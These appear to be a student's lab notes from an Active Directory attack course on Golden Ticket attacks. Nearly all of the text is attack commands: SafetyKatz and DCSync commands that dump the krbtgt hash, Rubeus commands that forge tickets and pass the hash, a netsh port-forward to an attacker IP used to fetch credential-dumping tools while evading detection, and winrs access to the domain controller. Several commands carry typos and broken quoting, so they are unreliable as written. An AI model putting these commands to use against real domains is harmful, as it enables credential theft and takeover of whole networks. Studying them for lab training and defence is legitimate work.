Assuming you already have Domain Admin access

# Golden Ticket

execute Mimikatz (or equivalent) on DC as DA to get krbtgt hash
`C:\AD\Tools\SaetyKatz.exe '"lsadump::lsa /patch"'`

for DCsync to get krbtgt hash
- using this option does not require code execution on DC
```
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:<DOMAIN>\krbtgt"'
exit
```
- krbtgt password never changes by default, making it very susceptible to attack

Use Rube-us to forget a golden ticket as well
`C:\AD\Tools\Rubeus.exe golden /aes256:<key> ldap /user:Administrator /rintcmd"`
- three LDAP entries are sent to the DC
	- retrieve flags for user specified in /user
	- retrieve groups, pgid, minipassage, and /maxpassage
	- retrieve /netbios of the current domain


# Learning Objective 8

## Extract krbtgt secrets
Run OPtH to get a session as svcadmin
`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:<aes_key> /opsec /createonly:C:\Windows\System32\cmd.exe /show /ptt`

Run ether DCSync or extracting secrets from DC -- if you need the AES key, you need to run DCSync
- DCSync with safetykatz
	- `C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evaise-dcsync /user:dcorp\krbtgt "exit"
- extracting secrets from DC
	- download loader on DC
		- `echo F | ecopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /V`
	- set up port forwarding to avoid detection
		- `netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<attacker_ip>`
	- download and run SafetyKatz
		- `C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"`


## Create a Golden Ticket

use rubeus to forge a golden ticket
`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:<aes_key> /ldap /user:Administrator /printcmd`
- /printcmd will give us a command to run to recreate the ticket with the information used within the Rubeus ticket
![[assets/Pasted image 20260204042226.png]]
- the only change we're going to do is run it with loader, change a couple of the beginning parameters, and add /ptt at the end
	- `C:\AD\Tools\Loader.exe path C:\AD\Tools\Rubeus.exe -args evasive-golden ....... /ptt`
		- binary paths and evasive-golden instead of Evasive-Golden

once the ticket is imported, access the DC
`winrs -r:dcorp-dc cmd`
![[assets/Pasted image 20260204042455.png]]

